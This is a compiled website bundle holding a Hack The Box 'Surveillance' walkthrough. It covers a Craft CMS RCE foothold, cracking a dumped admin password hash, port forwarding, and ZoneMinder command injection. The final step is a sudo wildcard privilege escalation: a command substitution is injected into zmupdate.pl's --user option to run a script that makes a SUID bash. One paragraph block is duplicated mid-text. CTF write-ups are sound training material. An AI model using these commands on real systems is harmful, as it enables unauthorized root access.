"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[8126],{6006:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"Hacking/Write-ups/Hack the box/medium/Surveillance/Surveillance","title":"Surveillance","description":"Enumeration","source":"@site/docs/Hacking/Write-ups/Hack the box/medium/Surveillance/Surveillance.md","sourceDirName":"Hacking/Write-ups/Hack the box/medium/Surveillance","slug":"/write-up/htb/medium/surveillance","permalink":"/docs/write-up/htb/medium/surveillance","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/write-up/htb/medium/surveillance","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var a=t(4848),i=t(8453);const r={slug:"/write-up/htb/medium/surveillance",pagination_next:null,pagination_prev:null},o=void 0,c={},l=[{value:"Enumeration",id:"enumeration",level:2},{value:"Foothold",id:"foothold",level:2},{value:"Lateral movement",id:"lateral-movement",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}];function h(e){const n={a:"a",code:"code",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title:  Surveillance \n|_http-server-header: nginx/1.18.0 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,a.jsx)(n.p,{children:"ubuntu jammy running nginx 1.18.0"}),"\n",(0,a.jsxs)(n.p,{children:["Browsing the web, we can see the following link: ",(0,a.jsx)(n.a,{href:"https://github.com/craftcms/cms/tree/4.4.14",children:"https://github.com/craftcms/cms/tree/4.4.14"}),". Looks like it's made with ",(0,a.jsx)(n.code,{children:"craftcms"})," and we have the precise version."]}),"\n",(0,a.jsx)(n.h2,{id:"foothold",children:"Foothold"}),"\n",(0,a.jsx)(n.p,{children:"Looks like it's vulnerable to a RCE vulnerability (fixed by 4.4.15):"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:(0,a.jsx)(n.a,{href:"https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability",children:"https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability"})}),"\n",(0,a.jsx)(n.li,{children:(0,a.jsx)(n.a,{href:"https://blog.calif.io/p/craftcms-rce",children:"https://blog.calif.io/p/craftcms-rce"})}),"\n",(0,a.jsx)(n.li,{children:(0,a.jsx)(n.a,{href:"https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226",children:"https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226"})}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"With latest POC, we got foothoold, now we can run a reverse shell, improve it and start investigating."}),"\n",(0,a.jsxs)(n.p,{children:["Right now we can acess as ",(0,a.jsx)(n.code,{children:"wwww-data"}),"."]}),"\n",(0,a.jsx)(n.h2,{id:"lateral-movement",children:"Lateral movement"}),"\n",(0,a.jsx)(n.p,{children:"In home we found two users:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"www-data@surveillance:~/html/craft/web/cpresources$ ls /home\nmatthew  zoneminder\n"})}),"\n",(0,a.jsx)(n.p,{children:"There are many things listening in localhost:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'www-data@surveillance:~/html/craft$ netstat -na |grep "LISTEN"\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     \ntcp6       0      0 :::22                   :::*                    LISTEN  \n'})}),"\n",(0,a.jsxs)(n.p,{children:["Looks like there's a ",(0,a.jsx)(n.code,{children:"ZoneMinder"})," server running in port 8080 but only listening in localhost. Looks really interesting for later."]}),"\n",(0,a.jsx)(n.p,{children:"I managed to exfiltrate the contents of /var/www and found the configuration to connect to mysql database which contains an entry for admin user:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"MariaDB [craftdb]> select username,fullName,password from users;\n+----------+-----------+--------------------------------------------------------------+\n| username | fullName  | password                                                     |\n+----------+-----------+--------------------------------------------------------------+\n| admin    | Matthew B | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe |\n+----------+-----------+--------------------------------------------------------------+\n"})}),"\n",(0,a.jsx)(n.p,{children:"If we manage to crack the hash, we might get the password of matthew user. Checking the contents, of the web there's a backup of the database which contains a different hash, it might be worth trying to crack it."}),"\n",(0,a.jsxs)(n.p,{children:["Crack it, got the user password for ",(0,a.jsx)(n.code,{children:"matthew"}),": Looks like there's a ",(0,a.jsx)(n.code,{children:"ZoneMinder"})," server running in port 8080 but only listening in localhost. Looks really interesting for later."]}),"\n",(0,a.jsx)(n.p,{children:"I managed to exfiltrate the contents of /var/www and found the configuration to connect to mysql database which contains an entry for admin user:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"MariaDB [craftdb]> select username,fullName,password from users;\n+----------+-----------+--------------------------------------------------------------+\n| username | fullName  | password                                                     |\n+----------+-----------+--------------------------------------------------------------+\n| admin    | Matthew B | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe |\n+----------+-----------+--------------------------------------------------------------+\n"})}),"\n",(0,a.jsx)(n.p,{children:"If we manage to crack the hash, we might get the password of matthew user. Checking the contents, of the web there's a backup of the database which contains a different hash, it might be worth trying to crack it."}),"\n",(0,a.jsxs)(n.p,{children:["Crack it, got the user password for ",(0,a.jsx)(n.code,{children:"matthew"}),". Now we can connect with SSH and read the user flag."]}),"\n",(0,a.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege escalation"}),"\n",(0,a.jsx)(n.p,{children:"The user cannot run sudo. Now that we have SSH access, we can do port forwarding to access the instance running in localhost:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ssh -L 8080:localhost:8080 matthew@surveillance.htb\n"})}),"\n",(0,a.jsxs)(n.p,{children:["We can have access to the ZoneMinder thing by using the user admin and the same password as ",(0,a.jsx)(n.code,{children:"matthew"}),"."]}),"\n",(0,a.jsx)(n.p,{children:"Now we can see the version:\nv1.36.32"}),"\n",(0,a.jsxs)(n.p,{children:["Looks like it's vulnerable to ",(0,a.jsx)(n.a,{href:"https://pentest-tools.com/vulnerabilities-exploits/zoneminder-snapshots-command-injection_22437",children:"https://pentest-tools.com/vulnerabilities-exploits/zoneminder-snapshots-command-injection_22437"})," because it mentions prior versions to 1.36.33 and 1.37.33"]}),"\n",(0,a.jsxs)(n.p,{children:["Since the process does not appear for the user ",(0,a.jsx)(n.code,{children:"matthew"}),", it might be running for another user or for ",(0,a.jsx)(n.code,{children:"root"}),". Either way, we can try to exploit the RCE vulnerability and continue from there."]}),"\n",(0,a.jsxs)(n.p,{children:["The POC worked perfectly and we got access to user ",(0,a.jsx)(n.code,{children:"zoneminder"}),". Now let's improve the shell and continue."]}),"\n",(0,a.jsx)(n.p,{children:"Checking what the user can do, looks like it can execute some script as root without specifying a password:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"zoneminder@surveillance:~$ sudo -l\nMatching Defaults entries for zoneminder on surveillance:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser zoneminder may run the following commands on surveillance:\n    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *\nzoneminder@surveillance:~$ \n"})}),"\n",(0,a.jsx)(n.p,{children:"This means any user can run any binary called zm*.pl in the /usr/bin/ directory under the root context, no password will be prompted. Morevoer, any option can be passed to the binary since it uses a wildcard in the sudoers file. This is a wide open configuration which can be abused using wildcard injection. Prepare a shell exploit."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"echo 'cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash' > /var/tmp/exploit.sh\nchmod +x /var/tmp/exploit.sh\n"})}),"\n",(0,a.jsx)(n.p,{children:"Now just run any zm* binary and inject a command calling the exploit, it will be executed under the root context. For example, using zmupdate with the --version option will force the tool to upgrade the database, and it allows us to inject a command to execute the exploit:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"sudo /usr/bin/zmupdate.pl --version=1 --user='$(/var/tmp/exploit.sh)'\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Now execute the copied bash with ",(0,a.jsx)(n.code,{children:"-p"})," and we got root access."]})]})}function d(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(h,{...e})}):h(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>o});var s=t(6540);const a={},i=s.createContext(a);function r(e){const n=s.useContext(i);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:r(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);